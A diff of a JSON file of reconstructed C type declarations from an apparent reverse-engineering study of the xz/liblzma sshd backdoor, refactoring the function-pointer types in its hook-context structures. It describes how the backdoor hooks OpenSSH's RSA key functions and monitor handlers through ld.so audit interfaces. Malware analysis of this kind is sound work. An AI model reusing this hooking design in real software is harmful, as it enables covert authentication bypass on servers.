-      "code": "typedef struct __attribute__((packed)) ldso_ctx {\n u8 _unknown1459[0x40];\n u32 *libcrypto_auditstate_bindflags_ptr;\n u32 libcrypto_auditstate_bindflags_old_value;\n u8 _unknown1476[0x4];\n u32 *sshd_auditstate_bindflags_ptr;\n u32 sshd_auditstate_bindflags_old_value;\n u8 _unknown1493[0x4];\n void* sshd_link_map_l_audit_any_plt_addr;\n u8 link_map_l_audit_any_plt_bitmask;\n u8 _unknown1510[0x7];\n struct audit_ifaces **_dl_audit_ptr;\n unsigned int *_dl_naudit_ptr;\n struct audit_ifaces hooked_audit_ifaces;\n u8 _unknown1538[0x30];\n char **libcrypto_l_name;\n void (*_dl_audit_symbind_alt)(struct link_map *l, const Elf64_Sym *ref, void **value, lookup_t result);\n size_t _dl_audit_symbind_alt__size;\n pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;\n pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;\n pfn_RSA_get0_key_t hook_RSA_get0_key;\n imported_funcs_t *imported_funcs;\n u64 hooks_installed;\n} ldso_ctx_t;"
+      "code": "typedef struct __attribute__((packed)) ldso_ctx {\n u8 _unknown1459[0x40];\n u32 *libcrypto_auditstate_bindflags_ptr;\n u32 libcrypto_auditstate_bindflags_old_value;\n u8 _unknown1476[0x4];\n u32 *sshd_auditstate_bindflags_ptr;\n u32 sshd_auditstate_bindflags_old_value;\n u8 _unknown1493[0x4];\n void* sshd_link_map_l_audit_any_plt_addr;\n u8 link_map_l_audit_any_plt_bitmask;\n u8 _unknown1510[0x7];\n struct audit_ifaces **_dl_audit_ptr;\n unsigned int *_dl_naudit_ptr;\n struct audit_ifaces hooked_audit_ifaces;\n u8 _unknown1538[0x30];\n char **libcrypto_l_name;\n dl_audit_symbind_alt_fn _dl_audit_symbind_alt;\n size_t _dl_audit_symbind_alt__size;\n pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;\n pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;\n pfn_RSA_get0_key_t hook_RSA_get0_key;\n imported_funcs_t *imported_funcs;\n u64 hooks_installed;\n} ldso_ctx_t;"
     },
     {
       "kind": "struct",
@@ -924,7 +1330,7 @@
       "names": [
         "backdoor_hooks_ctx_t"
       ],
-      "code": "typedef struct __attribute__((packed)) backdoor_hooks_ctx {\n u8 _unknown1621[0x30];\n backdoor_shared_globals_t *shared;\n backdoor_hooks_data_t **hooks_data_addr;\n uintptr_t (*symbind64)(\n  Elf64_Sym *sym, unsigned int ndx,\n  uptr *refcook, uptr *defcook,\n  unsigned int flags, const char *symname);\n pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;\n pfn_RSA_get0_key_t hook_RSA_get0_key;\n log_handler_fn mm_log_handler;\n u8 _unknown1631[sizeof(void *)];\n u8 _unknown1632[sizeof(void *)];\n sshd_monitor_func_t mm_answer_keyallowed;\n sshd_monitor_func_t mm_answer_keyverify;\n u8 _unknown1635[sizeof(void *)];\n} backdoor_hooks_ctx_t;"
+      "code": "typedef struct __attribute__((packed)) backdoor_hooks_ctx {\n u8 _unknown1621[0x30];\n backdoor_shared_globals_t *shared;\n backdoor_hooks_data_t **hooks_data_addr;\n audit_symbind64_fn symbind64;\n pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;\n pfn_RSA_get0_key_t hook_RSA_get0_key;\n mm_log_handler_fn mm_log_handler;\n u8 _unknown1631[sizeof(void *)];\n u8 _unknown1632[sizeof(void *)];\n sshd_monitor_func_t mm_answer_keyallowed;\n sshd_monitor_func_t mm_answer_keyverify;\n u8 _unknown1635[sizeof(void *)];\n} backdoor_hooks_ctx_t;"
     },
     {
       "kind": "struct",
@@ -1109,11 +1515,32 @@
       "code": "typedef struct __attribute__((packed)) backdoor_tls_get_addr_reloc_consts {\n ptrdiff_t tls_get_addr_plt_offset;\n ptrdiff_t tls_get_addr_random_symbol_got_offset;\n} backdoor_tls_get_addr_reloc_consts_t;"
     },
     {
+      "kind": "typedef",
+      "names": [
+        "init_hook_functions_fn"
+      ],
+      "code": "typedef int (*init_hook_functions_fn)(backdoor_hooks_ctx_t *funcs);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "elf_symbol_get_addr_fn"
+      ],
+      "code": "typedef void *(*elf_symbol_get_addr_fn)(elf_info_t *elf_info, EncodedStringId encoded_string_id);"
+    },
+    {
+      "kind": "typedef",
+      "names": [
+        "elf_parse_fn"
+      ],
+      "code": "typedef BOOL (*elf_parse_fn)(Elf64_Ehdr *ehdr, elf_info_t *elf_info);"
+    },
+    {
       "kind": "struct",
       "names": [
         "elf_functions_t"
       ],
-      "code": "typedef struct __attribute__((packed)) elf_functions {\n u64 reserved_before_init;\n int (*init_hook_functions)(backdoor_hooks_ctx_t *funcs);\n u64 reserved_before_symbol_lookup_0;\n u64 reserved_before_symbol_lookup_1;\n void *(*elf_symbol_get_addr)(elf_info_t *elf_info, EncodedStringId encoded_string_id);\n u64 reserved_before_elf_parse;\n BOOL (*elf_parse)(Elf64_Ehdr *ehdr, elf_info_t *elf_info);\n} elf_functions_t;"
+      "code": "typedef struct __attribute__((packed)) elf_functions {\n u64 reserved_before_init;\n init_hook_functions_fn init_hook_functions;\n u64 reserved_before_symbol_lookup_0;\n u64 reserved_before_symbol_lookup_1;\n elf_symbol_get_addr_fn elf_symbol_get_addr;\n u64 reserved_before_elf_parse;\n elf_parse_fn elf_parse;\n} elf_functions_t;"
     },
     {
       "kind": "struct",
@@ -1445,11 +1872,18 @@
       "code": "extern BOOL secret_data_append_item(\n secret_data_shift_cursor_t shift_cursor,\n unsigned operation_index,\n unsigned shift_count,\n int index, u8 *code);"
     },
     {
+      "kind": "typedef",
+      "names": [
+        "secret_data_appender_fn"
+      ],
+      "code": "typedef BOOL (*secret_data_appender_fn)(\n  secret_data_shift_cursor_t shift_cursor,\n  unsigned operation_index,\n  unsigned shift_count,\n  int index,\n  u8 *code);"
+    },
+    {
       "kind": "declaration",
       "names": [
         "secret_data_append_items"
       ],
-      "code": "extern BOOL secret_data_append_items(\n secret_data_item_t *items,\n u64 items_count,\n BOOL (*appender)(secret_data_shift_cursor_t, unsigned, unsigned, int, u8 *));"
+      "code": "extern BOOL secret_data_append_items(\n secret_data_item_t *items,\n u64 items_count,\n secret_data_appender_fn appender);"
     },
     {
       "kind": "declaration",
